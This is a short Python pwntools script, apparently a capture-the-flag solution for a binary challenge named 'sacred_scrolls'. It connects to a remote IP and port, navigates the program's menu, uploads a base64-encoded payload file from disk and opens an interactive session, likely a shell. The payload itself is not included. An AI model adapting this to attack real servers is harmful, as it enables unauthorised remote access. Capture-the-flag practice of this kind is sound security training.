from pwn import *
import base64
import shutil
import os

# Actual start
exe = ELF("./sacred_scrolls")
libc = ELF("./glibc/libc.so.6")
ld = ELF("./glibc/ld-linux-x86-64.so.2")

context.binary = exe

# Set debug mode
context.log_level = 'debug'

# proc = process([exe.path])
proc = remote('206.189.116.117', 32718)
output = proc.recvuntil('tag: ')

# Enter wizard num
proc.sendline(b'1')
output = proc.recvuntil('>> ')

# Enter Upload
proc.sendline(b'1') 
output = proc.recvuntil(': ')

# Upload the file
f = open('inputs/spell.zip', 'rb')
base64_bytes = base64.b64encode(f.read())
proc.sendline(base64_bytes)
output = proc.recvuntil('>> ')

# Read the file
proc.sendline(b'2')
output = proc.recvuntil('>> ')


# attach debugger
# gdb.attach(proc)
proc.interactive()
